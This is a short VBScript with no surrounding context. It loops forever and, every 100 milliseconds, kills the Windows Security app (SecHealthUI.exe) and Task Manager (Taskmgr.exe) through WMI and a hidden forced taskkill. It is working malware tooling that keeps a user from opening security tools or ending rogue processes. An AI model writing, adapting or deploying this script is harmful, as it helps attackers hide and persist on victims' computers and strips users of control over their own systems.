Set WshShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

Do While True
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'SecHealthUI.exe'")
    For Each objProcess In colProcesses
        objProcess.Terminate()
    Next
    WshShell.Run "taskkill /f /im SecHealthUI.exe", 0, False
    
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Taskmgr.exe'")
    For Each objProcess In colProcesses
        objProcess.Terminate()
    Next
    WshShell.Run "taskkill /f /im Taskmgr.exe", 0, False
    
    WScript.Sleep 100
Loop
